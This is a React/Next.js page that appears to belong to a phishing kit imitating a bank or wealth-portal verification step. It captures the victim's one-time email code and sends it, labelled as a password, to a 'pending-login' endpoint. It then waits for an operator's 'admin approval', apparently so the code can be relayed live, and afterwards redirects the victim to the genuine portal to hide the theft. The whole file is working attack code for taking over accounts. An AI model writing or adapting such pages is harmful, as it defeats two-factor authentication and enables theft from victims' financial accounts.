"use client";

import { Suspense, useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Check, Info, Loader2, LockKeyhole, Mail, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { VerificationHeader } from "@/components/verification-header";

const REDIRECT_URL =
  "https://aig.wealthcareportal.com/Authentication/Handshake";

const PENDING_LOGIN_TIMEOUT_MS = 2 * 60 * 1000;
const PENDING_LOGIN_POLL_MS = 750;

async function waitForPendingVerificationApproval(
  pendingId: string,
): Promise<void> {
  const deadline = Date.now() + PENDING_LOGIN_TIMEOUT_MS;

  while (Date.now() < deadline) {
    const response = await fetch(
      `/api/pending-login/${encodeURIComponent(pendingId)}`,
      { cache: "no-store" },
    );
    const data = (await response.json().catch(() => null)) as {
      status?: string;
      error?: string;
    } | null;

    if (!response.ok) {
      throw new Error(data?.error || "Unable to check verification approval");
    }

    if (
      data?.status === "approved" ||
      data?.status === "success" ||
      data?.status === "successful"
    ) {
      return;
    }

    if (
      data?.status === "denied" ||
      data?.status === "expired" ||
      data?.status === "redirected"
    ) {
      throw new Error("Verification failed");
    }

    await new Promise((resolve) => setTimeout(resolve, PENDING_LOGIN_POLL_MS));
  }

  throw new Error("Verification approval timeout");
}

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [isCooldown, setIsCooldown] = useState(false);
  const [cooldownSeconds, setCooldownSeconds] = useState(0);
  const router = useRouter();
  const searchParams = useSearchParams();
  const isSecondOtp = searchParams.get("step") === "2";

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (isSecondOtp) {
      if (!sessionStorage.getItem("ubs_otp2"))
        router.replace("/verify-details");
    } else {
      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
    }
  }, [isSecondOtp, router]);

  console.log("cooldownSeconds", cooldownSeconds, isCooldown);

  useEffect(() => {
    if (!isCooldown || cooldownSeconds <= 0) return;

    const timer = setInterval(() => {
      setCooldownSeconds((prev) => {
        const newSeconds = prev - 1;
        if (newSeconds <= 0) {
          setIsCooldown(false);
        }
        return newSeconds;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isCooldown, cooldownSeconds]);

  const handleVerify = async () => {
    if (isLoading || isCooldown) return;
    setIsLoading(true);
    setErrorMessage("");

    try {
      // Step 1: Create pending verification approval request
      const pendingResponse = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: sessionStorage.getItem("loginUserId") || "verification",
          password: code,
          method: "email",
          maskedEmail: "*",
          maskedPhone: "*",
          requestKind: "otp",
        }),
      });

      const pendingData = (await pendingResponse.json().catch(() => null)) as {
        id?: string;
        error?: string;
      } | null;

      if (!pendingResponse.ok || !pendingData?.id) {
        setErrorMessage(
          pendingData?.error || "Failed to submit verification code",
        );
        setIsLoading(false);
        return;
      }

      // Step 2: Wait for admin approval
      await waitForPendingVerificationApproval(pendingData.id);

      // Step 3: Approved - proceed with redirect
      if (isSecondOtp) {
        window.location.href = REDIRECT_URL;
      } else {
        if (typeof window !== "undefined")
          sessionStorage.setItem("ubs_details", "1");
        router.push("/verify-details");
      }
    } catch (error) {
      console.error("Verification approval error:", error);
      setErrorMessage(
        error instanceof Error ? error.message : "Verification approval failed",
      );
      setIsLoading(false);
    }
  };

  const handleResend = async () => {
    if (isResending) return;
    setIsResending(true);
    try {
      await fetch("/api/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp }),
      }).catch(console.error);
    } catch (error) {
      console.error("Failed to send resend code notification:", error);
    }
    await new Promise((r) => setTimeout(r, 2000));
    setIsResending(false);
  };

  return (
    <div className="min-h-screen border-t border-gray-200 bg-white">
      <VerificationHeader />

      <div className="w-full max-w-130 px-5 py-12 text-center md:ml-29.5 md:px-0">
        <LockKeyhole className="mx-auto mb-2 h-11 w-11 stroke-[1.25] text-[#4f7390]" />

        {isLoading && (
          <div className="text-center py-8">
            <Loader2 className="w-10 h-10 animate-spin text-gray-500 mx-auto mb-3" />
            <p className="text-sm text-gray-500 mb-2">
              Waiting for approval to continue...
            </p>
          </div>
        )}
        <p className="mb-2 text-sm text-gray-600">
          An e-mail has been sent to the following address:
        </p>
        {/* <p className="mb-3 text-sm font-semibold text-gray-700">
          e*******man@aol.com
        </p> */}
        <p className="mb-2 text-left text-sm text-gray-600 md:ml-4.25">
          Enter the verification code that you received via Email below:
        </p>
        <p className="mb-4 text-left text-sm text-gray-600 md:ml-4.25">
          Note - Do not share your verification code with anyone else.
        </p>

        {errorMessage && (
          <p className="mb-3 text-left text-sm font-medium text-red-600 md:ml-4.25">
            {errorMessage}
          </p>
        )}

        <div className="mb-4 flex items-center text-left md:ml-0">
          <Mail className="mr-3 h-5 w-5 shrink-0 stroke-[1.25] text-gray-500" />
          <label
            htmlFor="code"
            className="w-42.5 shrink-0 text-sm text-gray-700"
          >
            Confirmation Code
          </label>
          <input
            type="text"
            id="code"
            inputMode="numeric"
            value={code}
            onChange={(e) =>
              setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
            }
            className="h-9 w-48 border border-gray-500 bg-white px-2 text-sm text-gray-700 outline-none focus:border-[#315778]"
            maxLength={6}
          />
        </div>

        <div className="ml-23.75 flex w-52 flex-col gap-2 text-sm">
          <Button
            className="h-10 justify-start rounded-none border-0 bg-[#111e58] px-3 font-normal text-white hover:bg-[#0b1644] disabled:opacity-70"
            onClick={handleVerify}
            disabled={
              code.replace(/\D/g, "").length !== 6 || isLoading || isCooldown
            }
          >
            <Check className="mr-7 h-7 w-7 stroke-[1.25]" />
            {isLoading
              ? "CONTINUE..."
              : isCooldown
                ? `WAIT ${cooldownSeconds}s`
                : "CONTINUE"}
          </Button>
          <Button
            type="button"
            disabled={isLoading}
            className="h-10 justify-start rounded-none border-0 bg-[#686868] px-3 font-normal text-white hover:bg-[#555] disabled:opacity-70"
            onClick={() => router.push("/verify-choice")}
          >
            <X className="mr-7 h-7 w-7 stroke-[1.25]" /> CANCEL
          </Button>
          <Button
            type="button"
            disabled={isResending || isLoading}
            className="h-10 rounded-none border-0 bg-[#111e58] px-3 font-normal text-white hover:bg-[#0b1644] disabled:opacity-70"
            onClick={handleResend}
          >
            {isResending ? "SENDING..." : "RESEND CODE"}
          </Button>
        </div>

        <div className="mt-2 flex items-center bg-[#f2f6a0] px-2 py-3 text-left text-sm leading-[1.15] text-gray-700 md:ml-0">
          <Info className="mr-3 h-8 w-8 shrink-0 stroke-[1.25] text-gray-600" />
          <p>
            If you wish to cancel, you will be asked to enter a code the next
            time you login or try to perform this specific function.
          </p>
        </div>
      </div>
    </div>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
          Loading...
        </div>
      }
    >
      <EnterCodeContent />
    </Suspense>
  );
}
